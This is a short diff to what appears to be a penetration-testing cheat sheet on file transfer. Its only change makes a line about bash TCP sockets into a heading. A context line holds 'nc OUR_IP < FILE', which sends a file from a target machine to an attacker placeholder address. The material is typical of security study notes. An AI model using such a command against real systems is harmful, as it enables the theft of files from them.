@@ -10,7 +10,7 @@ Target Machine
 
     nc OUR_IP < FILE
 
-Use bash TCP socket to transfer a file if netcat is NOT installed on the target machine
+## Use bash TCP socket to transfer a file if netcat is NOT installed on the target machine
 
 ### Transfer to Attacker Machine
 
